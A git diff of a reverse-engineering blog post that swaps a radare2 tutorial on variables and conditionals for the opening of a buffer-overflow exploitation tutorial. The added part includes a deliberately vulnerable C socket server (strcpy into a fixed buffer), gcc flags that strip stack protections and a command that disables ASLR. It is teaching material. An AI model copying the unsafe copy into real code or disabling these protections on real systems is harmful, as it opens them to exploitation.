@@ -1,499 +1,877 @@
 ---
 layout: post
-title:  "Reverse engineering 32 and 64 bits binaries with Radare2 - 2"
+title:  "Reverse engineering x64 binaries with Radare2 - Exploiting basic Buffer Overflows"
 tags: [reversing, c, radare]
-featured_image_thumbnail: assets/images/radare2/radare2_2.png
-featured_image: assets/images/radare2/radare2_2.png
+featured_image_thumbnail: assets/images/radare2/radare2_20.png
+featured_image: assets/images/radare2/radare2_20.png
 ---
 
-Welcome to this next part of the reverse engineering with radare2 course :) Today we are going to walk through some simple data structures such as variables, understand how basic conditional code structures work on the inside and we will also learn how to debug with radare2.
+And after a very well deserved rest, here we go again. While these tutorials are generally aimed at developing skills in reverse engineergin using open source tools such as radare2 when possible I think that a general knowledge on basic exploitation techniques is a must, as most of the times you'll find malware using exploits to gain access to the system, you'll see your own projects failing due to mistakes that can be vulnerabilities and overall knowing about explotation will make things easier for you, as you will get a wider picture. 
 
-#### Variables
+So as we need to begin with something, we will begin with one of the simplest examples, a buffer overflow on a server program executed inside a x64 Linux system. 
 
-##### The code
-Let's start with this simple example. The following example-program, declares four variables, regarding to the numeric variables the first one represents an int, second one represents a float and the third one a double then we also have a char 'a'. At the end those values are added and the result is printed. We will see how the first variable gets directly stored in a (general purpose) register, the second one gets stored in memory too but in another place and the third one works the same with the exception that it needs 2 times the space of the second (double)
-~~~C
+
+#### (stack) Buffer overflows
+
+A buffer overflow vulnerability is the starting point for exploiting and it appears whenever we try to fill a buffer of size N with content the size >N so whatever we write fills the buffer AND the remains fill the adjacent positions in the stack. Not all buffer overflows have to end in a severe vulnerability, the vulnerability will appear when we start over writting memory positions that are needed for the correct execution of the program, that will lead to a failure. If we are smart enough to carefully identify what are we overwritting and its function in the execution flow of the program, we might be able to control that execution flow and make the machine running the vulnerable software run stuff of our own.
+
+Creating a buffer in C is as simple as the following:
+```C
+char buffer[50]
+```
+That piece of code, as we already know creates an array (buffer) of 50 bytes (char) if we try to write more than 50 bytes there, we have a buffer overflow.
+
+#### The stack
+
+The stack is a last in first out data structure. Two operations can be done there: PUSH to insert data on TOP and POP to retrieve the first element there (retrieve the element, remove it from the stack). During the execution of a program, a stack is used during function calls to create the associated stack frames for each function call. It also stores the return address of the function, that is the address to which control has to be passed when a function returns.
+
+The following image from buff3r(medium) summarizes it:
+
+![Stack](https://miro.medium.com/max/1156/1*Io2pbNYn8PeJCpSdNK8O8w.jpeg)
+
+As we see, the parameters (arguments) of a function are pushed on the stack followed by the "return address" (that is, the valie un register RIP) and the frame / base pointer (RBP) which points to the base of the previous stack frame. A stack frame is a memory management technique used in some programming languages for generating and eliminating temporary variables. In other words, it can be considered the collection of all information on the stack pertaining to a subprogram call. Stack frames are only existent during the runtime process. .In the x64 world as we know from previous tutorials, the first six arguments are not pushed on the stack at all but stored in registers, in x32 all is pushed on the stack [read more](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64/).  
+
+When a function returns, the "saved return address" is "popped" from the stack and loaded inside RIP (instruction pointer) and the execution continues from there. In your typical stack overfflow, you'll be concerned on how to overwrite this "saved return address" in the stack with another address that'll point to whenver you want your program to continue the exection, mostly you'll try to make the program jump to your shellcode (to spawn a shell or something).
+
+So let's get our hands into it. In this example we will be using the [Vulnerable Server](https://github.com/dennis95stumm/Vulnerable-Server) that's a server written in C which is vulnerable to several very basic attacks. We can download and compile it inside a, for example ubuntu 18.04 LTS x64 bits.
+
+```C 
+/**
+ * @file smart_server.c
+ * @author Dennis Stumm
+ * @brief This file contains a vulnerable socket server. To run the server
+ *   compile it and start with as following: ./NAME PORTNUMBER
+ * @version 1.0
+ * @date 2020-02-04
+ * 
+ * @copyright Copyright (c) 2020 Dennis Stumm
+ *******************************************************************************
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ *******************************************************************************
+ */
+
 #include <stdio.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <string.h>
+#include <unistd.h>
+#include <stdlib.h>
 
-int main() {
-  char ab ='a';
-  int a = 3;
-  float b = 4.5;
-  double c = 5.25;
-  float sum;
+/**
+ * @brief Sends the secret message over the passed socket.
+ *
+ * @param fd Socket to send the message over.
+ */
+void egg(int fd) {
+  char *message = "\x20\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f"
+    "\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x20\x0a\x7c\x3a\x3a\x3a"
+    "\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3b\x3b\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a"
+    "\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x3a"
+    "\x3a\x3a\x3a\x3a\x27\x7e\x7c\x7c\x7e\x7e\x7e\x60\x60\x3a\x3a\x3a\x3a\x3a\x3a\x3a"
+    "\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x27\x20\x20"
+    "\x20\x2e\x27\x3a\x20\x20\x20\x20\x20\x6f\x60\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a"
+    "\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x27\x20\x6f\x6f\x20\x7c\x20\x7c"
+    "\x6f\x20\x20\x6f\x20\x20\x20\x20\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a"
+    "\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x20\x38\x20\x20\x2e\x27\x2e\x27\x20\x20\x20\x20"
+    "\x38\x20\x6f\x20\x20\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a"
+    "\x3a\x3a\x3a\x3a\x20\x38\x20\x20\x7c\x20\x7c\x20\x20\x20\x20\x20\x38\x20\x20\x20"
+    "\x20\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x3a"
+    "\x20\x5f\x2e\x5f\x7c\x20\x7c\x5f\x2c\x2e\x2e\x2e\x38\x20\x20\x20\x20\x3a\x3a\x3a"
+    "\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x27\x7e\x2d\x2d\x2e"
+    "\x20\x20\x20\x2e\x2d\x2d\x2e\x20\x60\x2e\x20\x20\x20\x60\x3a\x3a\x3a\x3a\x3a\x3a"
+    "\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x27\x20\x20\x20\x20\x20\x3d\x38\x20\x20"
+    "\x20\x20\x20\x7e\x20\x20\x5c\x20\x6f\x20\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a"
+    "\x7c\x3a\x3a\x3a\x3a\x27\x20\x20\x20\x20\x20\x20\x20\x38\x2e\x5f\x20\x38\x38\x2e"
+    "\x20\x20\x20\x5c\x20\x6f\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a"
+    "\x27\x20\x20\x20\x5f\x5f\x2e\x20\x2c\x2e\x6f\x6f\x6f\x7e\x7e\x2e\x20\x20\x20\x20"
+    "\x5c\x20\x6f\x60\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x20\x20\x20\x2e"
+    "\x20\x2d\x2e\x20\x38\x38\x60\x37\x38\x6f\x2f\x3a\x20\x20\x20\x20\x20\x5c\x20\x20"
+    "\x60\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x27\x20\x20\x20\x20\x20\x2f\x2e\x20"
+    "\x6f\x20\x6f\x20\x5c\x20\x3a\x3a\x20\x20\x20\x20\x20\x20\x5c\x38\x38\x60\x3a\x3a"
+    "\x3a\x3a\x7c\x0a\x7c\x3a\x3b\x20\x20\x20\x20\x20\x6f\x7c\x7c\x20\x38\x20\x38\x20"
+    "\x7c\x64\x2e\x20\x20\x20\x20\x20\x20\x20\x20\x60\x38\x20\x60\x3a\x3a\x3a\x7c\x0a"
+    "\x7c\x3a\x2e\x20\x20\x20\x20\x20\x20\x20\x2d\x20\x5e\x20\x5e\x20\x2d\x27\x20\x20"
+    "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x60\x2d\x60\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x2e"
+    "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
+    "\x20\x20\x20\x20\x20\x20\x2e\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x2e\x2e"
+    "\x2e\x2e\x2e\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3a\x3a\x27\x20\x20\x20"
+    "\x20\x20\x60\x60\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x2d\x27\x60"
+    "\x2d\x20\x20\x20\x20\x20\x20\x20\x20\x38\x38\x20\x20\x20\x20\x20\x20\x20\x20\x20"
+    "\x20\x60\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x2d\x27\x2e\x20\x20\x20\x20\x20\x20\x20"
+    "\x20\x20\x20\x2d\x20\x20\x20\x20\x20\x20\x20\x3a\x3a\x20\x20\x20\x20\x20\x7c\x0a"
+    "\x7c\x3a\x2d\x7e\x2e\x20\x2e\x20\x2e\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
+    "\x20\x20\x20\x20\x20\x20\x20\x20\x3a\x20\x20\x20\x20\x20\x7c\x0a\x7c\x20\x2e\x2e"
+    "\x20\x2e\x20\x20\x20\x2e\x2e\x3a\x20\x20\x20\x6f\x3a\x38\x20\x20\x20\x20\x20\x20"
+    "\x38\x38\x6f\x20\x20\x20\x20\x20\x20\x20\x7c\x0a\x7c\x2e\x20\x2e\x20\x20\x20\x20"
+    "\x20\x3a\x3a\x3a\x20\x20\x20\x38\x3a\x50\x20\x20\x20\x20\x20\x64\x38\x38\x38\x2e"
+    "\x20\x2e\x20\x2e\x20\x20\x7c\x0a\x7c\x2e\x20\x20\x20\x2e\x20\x20\x20\x3a\x38\x38"
+    "\x20\x20\x20\x38\x38\x20\x20\x20\x20\x20\x20\x38\x38\x38\x27\x20\x20\x2e\x20\x2e"
+    "\x20\x20\x7c\x0a\x7c\x20\x20\x20\x6f\x38\x20\x20\x64\x38\x38\x50\x20\x2e\x20\x38"
+    "\x38\x20\x20\x20\x27\x20\x64\x38\x38\x50\x20\x20\x20\x2e\x2e\x20\x20\x20\x7c\x0a"
+    "\x7c\x20\x20\x38\x38\x50\x20\x20\x38\x38\x38\x20\x20\x20\x64\x38\x50\x20\x20\x20"
+    "\x27\x20\x38\x38\x38\x20\x20\x20\x20\x20\x20\x20\x20\x20\x7c\x0a\x7c\x20\x20\x20"
+    "\x38\x20\x20\x64\x38\x38\x50\x2e\x27\x64\x3a\x38\x20\x20\x2e\x2d\x20\x64\x50\x7e"
+    "\x20\x6f\x38\x20\x20\x20\x20\x20\x20\x20\x7c\x0a\x7c\x20\x20\x20\x20\x20\x20\x38"
+    "\x38\x38\x20\x20\x20\x38\x38\x38\x20\x20\x20\x20\x64\x7e\x20\x6f\x38\x38\x38\x20"
+    "\x20\x20\x20\x4c\x53\x20\x7c\x0a\x7c\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f"
+    "\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f"
+    "\x5f\x5f\x7c";
+  send(fd, message, strlen(message), 0);
+}
+
+/**
+ * @brief Checks whether the passed text equals to the secret text.
+ * 
+ * @param secret Text to check against the secret text.
+ * @return int 0 if the passed text isn't correct, 1 otherwhise.
+ */
+int checkAuth(char *secret) {
+  char secret_buffer[42];
+  int auth_flag = 0;
+
+  strcpy(secret_buffer, secret);
+
+  if (strcmp(secret_buffer, "You don't know the power of the dark side") == 0)
+    auth_flag = 1;
+
+  return auth_flag;
+}
+
+/**
+ * @brief Handles an incoming connection to the server.
+ * 
+ * @param sock The socket to handle the connection on.
+ */
+void handleConnection(int sock) {
+  struct sockaddr_in client;
+  socklen_t len;
+  char *message;
+  int fd, recv_size;
+  char secret_buffer[1024];
+
+  len = sizeof(client);
+  fd = accept(sock, (struct sockaddr*) &client, &len);
+  if (fd < 0) {
+    printf("Error acepting\n");
+    exit(-1);
+  }
+
+  printf("Got connection!\n");
+  message = "Welcome! Please enter the secret text:\n";
+  send(fd, message, strlen(message), 0);
+  recv_size = recv(fd, secret_buffer, 1024, 0);
+
+  if (recv_size <= 0) {
+    printf("Connection close!\n");
+    close(fd);
+    return;
+  }
   
-  sum = a+b+c;
+  secret_buffer[recv_size-1] = '\0';
+  
+  while (!checkAuth(secret_buffer)) {
+    message = "The secret was wrong, please try again:\n";
+    send(fd, message, strlen(message), 0);
+    recv_size = recv(fd, secret_buffer, 1024, 0);
 
-  printf("The sum of a, b, and c is %f.", sum);
+    if (recv_size <= 0) {
+      printf("Connection close!\n");
+      close(fd);
+      return;
+    }
+
+    secret_buffer[recv_size-1] = '\0';
+  }
+
+  egg(fd);
+
+  printf("Connection close!\n");
+  close(fd);
+}
+
+/**
+ * @brief Starts a socket server listening on the passed port on any ip address.
+ * 
+ * @param port Portnumber the socket server should listen on.
+ */
+void start(int port) {
+  struct sockaddr_in server;
+  int sock;
+  
+  sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+  if (sock < 0) {
+    printf("Error opening socket\n");
+    exit(-1);
+  }
+
+  server.sin_port = htons(port);
+  server.sin_addr.s_addr = INADDR_ANY;
+  server.sin_family = AF_INET;
+
+  if (bind(sock, (struct sockaddr*) &server, sizeof(server)) < 0) {
+    printf("Error binding socket\n");
+    exit(-1);
+  }
+
+  if (listen(sock, 5) == -1) {
+    printf("Error listening\n");
+    exit(-1);
+  }
+
+  printf("Waiting for connections...\n");
+  
+  while (1) {
+    fflush(stdout);
+    handleConnection(sock);
+  }
+}
+
+/**
+ * @brief Main function that calls the function to start the socket server.
+ * 
+ * @param argc Number of arguments passed to the application.
+ * @param argv Array containing the arguments passed to the application.
+ * @return int Status with which the application finishes.
+ */
+int main(int argc, char* argv[]) {
+  if (argc != 2) {
+    printf("Usage: %s PORT \n", argv[0]);
+    return 0;
+  }
+
+  start(atoi(argv[1]));
+
   return 0;
 }
-~~~
-As always, we can compile the code by using gcc, no mistery.
-##### The binary
-We open the binary and then we analyze its content, aaa should work fine.
-~~~
- -- sudo make me a pancake
-[0x08048310]> aaa
-[Cannot analyze at 0x08048300g with sym. and entry0 (aa)
-[x] Analyze all flags starting with sym. and entry0 (aa)
-[Cannot analyze at 0x08048300ac)
-[x] Analyze function calls (aac)
-[x] Analyze len bytes of instructions for references (aar)
-[x] Check for objc references
-[x] Check for vtables
-[x] Type matching analysis for all functions (aaft)
-[x] Propagate noreturn information
-[x] Use -AA or aaaa to perform additional experimental analysis.
-[0x08048310]> 
-~~~
-As we compiled the binary using GCC, we can identify some "typical" functions related to the initialization of the program.
-~~~
-[0x08048310]> afl
-0x08048310    1 33           entry0
-0x080482f0    1 6            sym.imp.__libc_start_main
-0x08048350    4 43           sym.deregister_tm_clones
-0x08048380    4 53           sym.register_tm_clones
-0x080483c0    3 30           entry.fini0
-0x080483e0    4 43   -> 40   entry.init0
-0x080484f0    1 2            sym.__libc_csu_fini
-0x08048340    1 4            sym.__x86.get_pc_thunk.bx
-0x080484f4    1 20           sym._fini
-0x08048490    4 93           sym.__libc_csu_init
-0x0804840b    1 123          main
-0x080482e0    1 6            sym.imp.printf
-0x080482ac    3 35           sym._init
-[0x08048310]> 
-~~~
-The only interesting function here is the "main" one as it clearly belongs to the "main" function of the program. From here we can also identify that "printf" is used in the program.
-~~~
-[0x08048310]> sf main
-[0x0804840b]> pdf
-            ; DATA XREF from entry0 @ 0x8048327
-┌ 123: int main (int32_t arg_4h, char **argv, char **envp);
-│           ; var char var_1dh @ ebp-0x1d
-│           ; var int32_t var_1ch @ ebp-0x1c
-│           ; var int32_t var_4h @ ebp-0x4
-│           ; arg int32_t arg_4h @ esp+0x4c
-│           0x0804840b      8d4c2404       lea ecx, [arg_4h]
-│           0x0804840f      83e4f0         and esp, 0xfffffff0
-│           0x08048412      ff71fc         push dword [ecx - 4]
-│           0x08048415      55             push ebp
-│           0x08048416      89e5           mov ebp, esp
-│           0x08048418      51             push ecx
-│           0x08048419      83ec34         sub esp, 0x34
-│           0x0804841c      c645e361       mov byte [var_1dh], 0x61    ; 'a' ; 97
-│           0x08048420      c745e4030000.  mov dword [var_1ch], 3
-│           0x08048427      d9054c850408   fld dword [0x804854c]
-│           0x0804842d      d95de8         fstp dword [ebp - 0x18]
-│           0x08048430      dd0550850408   fld qword [0x8048550]
-│           0x08048436      dd5df0         fstp qword [ebp - 0x10]
-│           0x08048439      d9ee           fldz
-│           0x0804843b      d95dec         fstp dword [ebp - 0x14]
-│           0x0804843e      db45e4         fild dword [var_1ch]
-│           0x08048441      d845e8         fadd dword [ebp - 0x18]
-│           0x08048444      dc45f0         fadd qword [ebp - 0x10]
-│           0x08048447      d95dec         fstp dword [ebp - 0x14]
-│           0x0804844a      d945ec         fld dword [ebp - 0x14]
-│           0x0804844d      83ec04         sub esp, 4
-│           0x08048450      8d6424f8       lea esp, [esp - 8]
-│           0x08048454      dd1c24         fstp qword [esp]
-│           0x08048457      6810850408     push str.The_sum_of_a__b__and_c_is__f. ; 0x8048510 ; "The sum of a, b, and c is %f." ; const char *format
-│           0x0804845c      e87ffeffff     call sym.imp.printf         ; int printf(const char *format)
-│           0x08048461      83c410         add esp, 0x10
-│           0x08048464      0fbe45e3       movsx eax, byte [var_1dh]
-│           0x08048468      83ec08         sub esp, 8
-│           0x0804846b      50             push eax
-│           0x0804846c      682e850408     push str.The_value_of_char_ab_is__c. ; 0x804852e ; "The value of char ab is %c." ; const char *format
-│           0x08048471      e86afeffff     call sym.imp.printf         ; int printf(const char *format)
-│           0x08048476      83c410         add esp, 0x10
-│           0x08048479      b800000000     mov eax, 0
-│           0x0804847e      8b4dfc         mov ecx, dword [var_4h]
-│           0x08048481      c9             leave
-│           0x08048482      8d61fc         lea esp, [ecx - 4]
-└           0x08048485      c3             ret
-[0x0804840b]> 
+```
 
-~~~
-As we look through the main code of the program we see some new instructions here, like fstp, fild, fadd and so forth by pure deduction we could state that those may be related to "floating point operations" as we use float and double here. We can also identify how the print function is called, we see some parameters being pushed onto the stack.  
+We'll have to compile it the following way:
+```
+gcc -fno-stack-protector -no-pie -z execstack
+```
+As otherwise, we'll face more advanced protection measures against this kind of basic attacks. As for example, by default DEP marks sections of the memory of our programs such as the stack as non executable, so we can overflow the stack but do nothing on it. Canaries can also be used to mark buffer sections and thus detect if buffer overflows are happening and kill the program to avoid the exploit. [Read about them](https://en.wikipedia.org/wiki/Buffer_overflow_protection). By using the params/flags presented in the gcc command, we make sure we can play with our vulnerable server and replicate this tutorial.
 
-As we are dealing with variables here, one of the things we may want to do is to see how radare2 identifies variables and maybe give them a nice name. We can doo this by using afv.
-~~~
-[0x0804840b]> afv
-arg int32_t arg_4h @ esp+0x4c
-var char var_1dh @ ebp-0x1d
-var int32_t var_1ch @ ebp-0x1c
-var int32_t var_4h @ ebp-0x4
-[0x0804840b]> 
-~~~
-As we clearly identify a char with radare2 (var char var_1...) we can rename that variable to char
-~~~
-[0x0804840b]> afvn  char1 var_1dh
-[0x0804840b]> afvn
-char1
-var_1ch
-var_4h
-arg_4h
-[0x0804840b]> 
-~~~
-That char variable is interesting. When using char variables, what really happens internally is that those chars are hex encoded. In hex, 'a' corresponds to 61 in the ascii table. In our example we can simply see how the program uses mov to move the 0x61 byte to the position of the variable.
-~~~
-0x0804841c      c645e361       mov byte [var_1dh], 0x61    ; 'a' ; 97
-0x08048420      c745e4030000.  mov dword [var_1ch], 3
-~~~
-Now that we have the char variable identified, and we should already be able to identify the int variable as well let's look at how the program deals with floating point variables.  
+You may also want to disable ASLR for this one:
 
-The best way to inspect that is by running the program in debug mode. In radare2 we can open a program in debug mode by using the -d option.  
+```
+echo 0 > /proc/sys/kernel/randomize_va_space
+```
+As it randomizes memory addresses to avoid attackers hardcode addresses to memory positions such as relevant function calls etc [Read about ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) We'll be hardcoding stuff in here so consider it.
 
-In debug mode we can use commands such as "db memaddress" to set a breakpoint, "dc" to continue the execution flow to that/those breakpoint(s) and "dt" to run the current instruction and move to the next one right after.  
+Let's get to it then. After compiling the program we can run it in radare2 debug mode with 
 
-In our program we can set some interesting points before the fldz, flstp and such.
-~~~
-[0x0804840b]> db 0x08048427
-[0x0804840b]> db 0x0804842d
-[0x0804840b]> db 0x08048430
-[0x0804840b]> dc
-hit breakpoint at: 8048427
-[0x08048427]> 
-~~~
-After we hit our first breakpoint we move to:
-~~~
-│           0x08048420      c745e4030000.  mov dword [var_1ch], 3
-│           0x08048427      d9054c850408   fld dword [0x804854c]
-│           0x0804842d      d95de8         fstp dword [ebp - 0x18]
-~~~
-We can identify that the 3 value has been moved to var_1ch and then some strange instruction is executed "fld dword". The fld instruction loads a 32 bit, 64 bit, or 80 bit floating point value onto the stack. This instruction converts 32 and 64 bit operand to an 80 bit extended precision value before pushing the value onto the floating point stack. So if we inspect what value is fld picking up for loading we will see something like:
-~~~
-[0x08048427]> px 32 @ 0x804854c
-- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
-0x0804854c  0000 9040 0000 0000 0000 1540 011b 033b  ...@.......@...;
-0x0804855c  2800 0000 0400 0000 78fd ffff 4400 0000  (.......x...D...
-[0x08048427]> 
-~~~
-" 0000 9040 0000 0000 0000 ".We can now try to inspect the contents of that position in memory which clearly corresponds to a variable
-~~~
-[0x08048430]> px @ ebp-0x18
-- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
-0xbfe7a7e0  0000 9040 a4a8 e7bf aca8 e7bf b184 0408  ...@............
-0xbfe7a7f0  dc93 f6b7 10a8 e7bf 0000 0000 37f6 dcb7  ............7...
-0xbfe7a800  0090 f6b7 0090 f6b7 0000 0000 37f6 dcb7  ............7...
-~~~
-We can make the output a little bit more nice and human readable (for our case) by adding w and thus running pxw when w comes from word (two bytes)
-~~~
-[0x08048430]> pxw @ ebp-0x18
-0xbfe7a7e0  0x40900000 0xbfe7a8a4 0xbfe7a8ac 0x080484b1  ...@............
-0xbfe7a7f0  0xb7f693dc 0xbfe7a810 0x00000000 0xb7dcf637  ............7...
-~~~
-"0x40900000" must be the value. But that value gives us few information, at least in this format. As we suspect that this number represents a floating point encoded number, we can try to use the "rax2" tool to read it. 
-~~~
-[0xbfe7a7f0]> rax2  Fx40900000
-4.500000f
-~~~
-And we can clearly see how this number corresponds to the value of our first floating point variable.  
-
-We can do this exact same thing with the second variable, I will leave it up to you, you will find the value of 5.25, but as its a "double" value, instead of one word, we will have a size of 32.  
-  
-So finally, we can see how those parameters are pusshed to the stack. The string "The sum of..." is pushed directly to the stack by just doing "push" and the "sum" variable is inserted in to the stack by using the fstp instruction. The FST instruction copies the value in the ST(0) register to the destination operand, which can be a memory location or another register in the FPU register stack. When storing the value in memory, the value is converted to single- or double-real format.
-~~~
-|           0x08048447      d95dec         fstp dword [ebp - 0x14]
-│           0x0804844a      d945ec         fld dword [ebp - 0x14]
-│           0x0804844d      83ec04         sub esp, 4
-│           0x08048450      8d6424f8       lea esp, [esp - 8]
-│           0x08048454      dd1c24         fstp qword [esp]
-│           0x08048457      6810850408     push str.The_sum_of_a__b__and_c_is__f. ; 0x8048510 ; "The sum of a, b, and c is %f." ; const char *format
-│           0x0804845c      e87ffeffff     call sym.imp.printf         ; int printf(const char *format)
-~~~
-We see how the "sum" value comes from ebp-0x14 as a result of the previous operation:
-~~~
-[0x08048444]> pxw @ ebp-0x14
-0xbf8e0ba4  0x00000000 0x00000000 0x40150000 0xb7f573dc  ...........@.s..
-~~~
-And it clearly corresponds to the actual result:
-~~~
-[0x0804844d]> rax2 Fx414c0000
-12.750000f (as float)
-~~~
-And then it appears on the stack along with the address that points to the string to be printed
-~~~
-[0x0804845c]> pxw @ esp
-0xbf8e0b70  0x08048510 0x00000000 0x40298000 0xb7f711b0  ..........)@....
-0xbf8e0b80  0x00008000 0xb7f57000 0xb7f55244 0xb7dbd0ec  .....p..DR......
-0xbf8e0b90  0x00000001 0x00000000 0x61dd3a50 0x00000003  ........P:.a....
-~~~
-*note that little endian is used here and 0x4029800000000000 = 12.75 as double = sum
-#### Conditional structures
-
-##### The code 
-We will start with the following piece of code. It will declare a variable as a signed integer, then it will read the user input and store it in that variable. After that it will check whether if is a positive or negative int then print a message.
-~~~C
-#include <stdio.h>
-int main() {
-    signed int number;
-    printf("Enter an integer: ");
-    scanf("%d", &number);
-    if (number > 0) {
-        printf("You entered %d.\n", number);
-    }
-    else{
-                printf("You entered a negative number %d.\n", number);
-        }
-    printf("The if statement is easy.");
-    return 0;
-
-~~~
-
-##### The binary
-We start as usual by running the program with r2 -d analyzing it and switching to the main function and running pdf to peek inside it:
-~~~
-[0x080484bb]> pdf
-            ; DATA XREF from entry0 @ 0x80483d7
-┌ 159: int main (int argc, char **argv, char **envp);
-│           ; var int32_t var_10h @ ebp-0x10
-│           ; var int32_t var_ch @ ebp-0xc
-│           ; var int32_t var_4h @ ebp-0x4
-│           ; arg int32_t arg_4h @ esp+0x34
-│           0x080484bb      8d4c2404       lea ecx, [arg_4h]
-│           0x080484bf      83e4f0         and esp, 0xfffffff0
-│           0x080484c2      ff71fc         push dword [ecx - 4]
-│           0x080484c5      55             push ebp
-│           0x080484c6      89e5           mov ebp, esp
-│           0x080484c8      51             push ecx
-│           0x080484c9      83ec14         sub esp, 0x14
-│           0x080484cc      65a114000000   mov eax, dword gs:[0x14]
-│           0x080484d2      8945f4         mov dword [var_ch], eax
-│           0x080484d5      31c0           xor eax, eax
-│           0x080484d7      83ec0c         sub esp, 0xc
-│           0x080484da      68e0850408     push str.Enter_an_integer:  ; 0x80485e0 ; "Enter an integer: "
-│           0x080484df      e88cfeffff     call sym.imp.printf         ; int printf(const char *format)
-│           0x080484e4      83c410         add esp, 0x10
-│           0x080484e7      83ec08         sub esp, 8
-│           0x080484ea      8d45f0         lea eax, [var_10h]
-│           0x080484ed      50             push eax
-│           0x080484ee      68f3850408     push 0x80485f3
-│           0x080484f3      e8a8feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
-│           0x080484f8      83c410         add esp, 0x10
-│           0x080484fb      8b45f0         mov eax, dword [var_10h]
-│           0x080484fe      85c0           test eax, eax
-│       ┌─< 0x08048500      7e16           jle 0x8048518
-│       │   0x08048502      8b45f0         mov eax, dword [var_10h]
-│       │   0x08048505      83ec08         sub esp, 8
-│       │   0x08048508      50             push eax
-│       │   0x08048509      68f6850408     push str.You_entered__d.    ; 0x80485f6 ; "You entered %d.\n"
-│       │   0x0804850e      e85dfeffff     call sym.imp.printf         ; int printf(const char *format)
-│       │   0x08048513      83c410         add esp, 0x10
-│      ┌──< 0x08048516      eb14           jmp 0x804852c
-│      │└─> 0x08048518      8b45f0         mov eax, dword [var_10h]
-│      │    0x0804851b      83ec08         sub esp, 8
-│      │    0x0804851e      50             push eax
-│      │    0x0804851f      6808860408     push str.You_entered_a_negative_number__d. ; 0x8048608 ; "You entered a negative number %d.\n"
-│      │    0x08048524      e847feffff     call sym.imp.printf         ; int printf(const char *format)
-│      │    0x08048529      83c410         add esp, 0x10
-│      │    ; CODE XREF from main @ 0x8048516
-│      └──> 0x0804852c      83ec0c         sub esp, 0xc
-│           0x0804852f      682b860408     push str.The_if_statement_is_easy. ; 0x804862b ; "The if statement is easy."
-│           0x08048534      e837feffff     call sym.imp.printf         ; int printf(const char *format)
-│           0x08048539      83c410         add esp, 0x10
-│           0x0804853c      b800000000     mov eax, 0
-│           0x08048541      8b55f4         mov edx, dword [var_ch]
-│           0x08048544      653315140000.  xor edx, dword gs:[0x14]
-│       ┌─< 0x0804854b      7405           je 0x8048552
-│       │   0x0804854d      e82efeffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
-│       └─> 0x08048552      8b4dfc         mov ecx, dword [var_4h]
-│           0x08048555      c9             leave
-│           0x08048556      8d61fc         lea esp, [ecx - 4]
-└           0x08048559      c3             ret
-~~~
-So in here, we can start seeing some arrows moving up and down the code. Those arrows indicate the execution flow that the program may follow depending on certain conditions, as we already have the code, we can guess that those flow directions relate to the IF-ELSE part of the code somehow. We also see some variables being declared on top of the code.
-
-The next thing that may get our attention is the call to the SCANF function. Let's examine it, by setting some breakpoints with "db":
-~~~
-│           0x080484df      e88cfeffff     call sym.imp.printf         ; int printf(const char *format)
-│           0x080484e4      83c410         add esp, 0x10
-│           0x080484e7      83ec08         sub esp, 8
